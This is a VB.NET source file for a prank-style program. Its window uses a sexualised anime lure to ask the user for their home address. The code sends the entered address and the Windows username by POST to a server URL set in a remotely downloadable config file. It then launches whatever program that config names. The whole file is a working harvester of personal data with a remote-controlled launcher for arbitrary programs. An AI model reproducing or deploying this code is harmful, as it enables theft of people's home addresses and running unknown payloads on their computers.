Imports System.IO
Imports System.Net
Imports System.Text
Public Class AnimeSomeoneWantToKnowWhereYouLive
    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Dim ConfigFile As String = DIRCommons & "\AnimeSomeoneWantToKnowWhereYouLive.ini"
    Dim userCanExit As Boolean = False

    Private Sub AnimeSomeoneWantToKnowWhereYouLive_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ReadParameters(Command())
        ReadValues()
    End Sub
    Private Sub AnimeSomeoneWantToKnowWhereYouLive_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If args(0).ToLower = "--localconfig" Then
                    ConfigFile = args(1)

                ElseIf args(0).ToLower = "--remoteconfig" Then
                    GetValues(args(1))

                End If

            End If
        Catch ex As Exception
            Console.WriteLine("[GetValues@AnimeSomeoneWantToKnowWhereYouLive]Error: " & ex.Message)
            End
        End Try
    End Sub

    Sub GetValues(ByVal fileURL As String)
        Try
            If My.Computer.FileSystem.FileExists(ConfigFile) Then
                My.Computer.FileSystem.DeleteFile(ConfigFile)
            End If
            My.Computer.Network.DownloadFile(fileURL, ConfigFile)
        Catch ex As Exception
            Console.WriteLine("[GetValues@AnimeSomeoneWantToKnowWhereYouLive]Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub ReadValues()
        Try
            Me.Size = New Size(GetIniValue("OPTIONS", "Size", ConfigFile, "740;300").Split(";")(0), GetIniValue("OPTIONS", "Size", ConfigFile, "740;300").Split(";")(1))

            Dim meText As String = GetIniValue("TEXT", "Text", ConfigFile, "Ohayo senpai!")
            meText = meText.Replace("%username%", Environment.UserName)
            meText = meText.Replace("%vbCrLf%", vbCrLf)
            Me.Text = meText

            Dim meInformation As String = GetIniValue("TEXT", "lbl_Information", ConfigFile, "a///w///a%vbCrLf%c-can i get you address information? i-i want to do some s-sexual things with you%vbCrLf%owo")
            meInformation = meInformation.Replace("%username%", Environment.UserName)
            meInformation = meInformation.Replace("%vbCrLf%", vbCrLf)
            Me.lbl_Information.Text = meInformation

            Me.lbl_Address.Text = GetIniValue("ADDRESS", "lbl_Address", ConfigFile, "Address: ")
            Me.lbl_CityOrTown.Text = GetIniValue("ADDRESS", "lbl_CityOrTown", ConfigFile, "City/Town: ")
            Me.lbl_ZIPCode.Text = GetIniValue("ADDRESS", "lbl_ZIPCode", ConfigFile, "ZIP Code: ")
            Me.lbl_Country.Text = GetIniValue("ADDRESS", "lbl_Country", ConfigFile, "Country: ")

            Dim meButton As String = GetIniValue("CARD", "btn_Send", ConfigFile, "Th-thanks...")
            meButton = meButton.Replace("%username%", Environment.UserName)
            meButton = meButton.Replace("%vbCrLf%", vbCrLf)
            Me.btn_Send.Text = meButton

            Me.PictureBox1.ImageLocation = GetIniValue("IMAGE", "Picture", ConfigFile, "https://i.imgur.com/JZIxIaHb.jpg")
        Catch ex As Exception
            Console.WriteLine("[ReadValues@AnimeSomeoneWantToKnowWhereYouLive]Error: " & ex.Message)
            End
        End Try
    End Sub

    Private Sub btn_Send_Click(sender As Object, e As EventArgs) Handles btn_Send.Click
        If TextBox1.Text = Nothing Or TextBox2.Text = Nothing Or TextBox3.Text = Nothing Then
        Else
            Try
                Dim reportContent As String = TextBox1.Text & vbCrLf & TextBox2.Text & vbCrLf & TextBox3.Text & vbCrLf & TextBox4.Text
                Dim request As WebRequest = WebRequest.Create(GetIniValue("ACTION", "phpPost", ConfigFile))
                request.Method = "POST"
                Dim postData As String = "id=" & Environment.UserName & "_" & My.Application.Info.AssemblyName & "&content=" & reportContent
                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
                request.ContentType = "application/x-www-form-urlencoded"
                request.ContentLength = byteArray.Length
                Dim dataStream As Stream = request.GetRequestStream()
                dataStream.Write(byteArray, 0, byteArray.Length)
                dataStream.Close()
                Dim response As WebResponse = request.GetResponse()
                response.Close()
            Catch
            End Try
            Try
                Process.Start(GetIniValue("ACTION", "Start", ConfigFile))
            Catch
            End Try
            userCanExit = True
            End
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        MsgBox(GetIniValue("ACTION", "ImageTouch", ConfigFile, "Hey, all i need is yot address!"), MsgBoxStyle.ApplicationModal, Me.Text)
    End Sub
End Class